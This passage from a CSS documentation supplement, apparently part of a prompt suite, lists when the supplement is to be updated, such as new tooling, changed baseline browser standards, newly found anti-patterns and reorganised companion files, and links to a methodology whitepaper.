- A domain prompt under `vsdd-suite/domains/role/` adds or changes a dimension that CSS owns or influences. The supplement should track the domain prompt — if Accessibility adds a new contrast requirement, the [Accessibility](#accessibility) section here should mirror it.
- A new CSS-ecosystem tool reaches consolidating-default status (the way [stylelint](https://stylelint.io/) consolidated CSS linting, the way [Tailwind CSS](https://tailwindcss.com/) consolidated utility-first). The Tooling section should list it; the relevant per-domain section should reference it.
- A baseline-standards shift lands in the broader CSS ecosystem (e.g., `@container` queries moving from "experimental" to "baseline"; `:has()` reaching stable Safari support; a new CSS module reaching wide deployment). The Baseline standards section should be updated.
- A new CSS-specific anti-pattern surfaces in project review (a real failure mode in a real project, named and addressed). Add to § Anti-patterns with the worked example.
- A companion supplement (`html.md`, `browser-app.md`, [`javascript-typescript.md`](javascript-typescript.md)) reorganizes content in a way that affects what belongs here vs. there. Cross-references should remain accurate.

The supplement is a living artifact — additions over time are expected. Removals are appropriate when a dimension reaches "obvious to any practitioner" status and no longer needs explicit naming (rare; CSS is broad enough that most dimensions deserve to stay called out).

See the [VSDD whitepaper](https://gist.github.com/dollspace-gay/d8d3bc3ecf4188df049d7a4726bb2a00) for the methodology context; [dollspace.gay](https://github.com/dollspace-gay) for the suite originator and ongoing authorship.
